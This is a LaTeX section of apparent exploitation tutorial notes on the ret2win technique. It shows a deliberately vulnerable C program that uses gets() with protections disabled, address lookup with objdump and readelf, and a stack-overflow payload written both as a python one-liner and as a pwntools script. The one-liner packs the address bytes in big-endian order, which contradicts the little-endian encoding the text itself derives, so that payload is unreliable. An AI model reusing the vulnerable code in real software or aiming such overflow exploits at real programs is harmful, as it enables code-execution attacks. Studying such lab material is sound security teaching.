\subsection{ret2win}
A ret2win is simply a binary where there is a {\emph win} function to which the
redirection to it is sufficient.
\begin{verbatim}
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[40];

    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}

void flag() {
    puts("Exploited!!!!!");
}

\end{verbatim}

based on the offset found the only thing remaining to do is to get the address
of the function we need to jump to
it can be obtained with \verb+gdb+, \verb+objdump+
\begin{verbatim}
80491c2:       c3                      ret

080491c3 <flag>:
 80491c3:       55                      push   %ebp
\end{verbatim}

\begin{verbatim}
readelf --symbols --wide vuln | grep FUNC
...SNIP...    
66: 080491c3    43 FUNC    GLOBAL DEFAULT   13 flag
67: 08049000     0 FUNC    GLOBAL HIDDEN    11 _init
\end{verbatim}

in order to craft the payload the endianness must be taken into account
\begin{verbatim}
$ readelf --headers vuln |grep endian
  Data:                              2's complement, little endian
\end{verbatim}

so in this case \verb+080491c3+ will be \verb+\xc3\x91\x04\x08+

the payload here is quite simple:
\begin{verbatim}
$(python -c "print('\x55' * offset + '\x08\x04\x91\xc3')")
\end{verbatim}

with pwntools:
\begin{verbatim}
from pwn import *            # This is how we import pwntools

p = process('./vuln')        # We're starting a new process

payload = b'A' * 52
payload += p32(0x080491c3)   # or p64 Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
\end{verbatim}

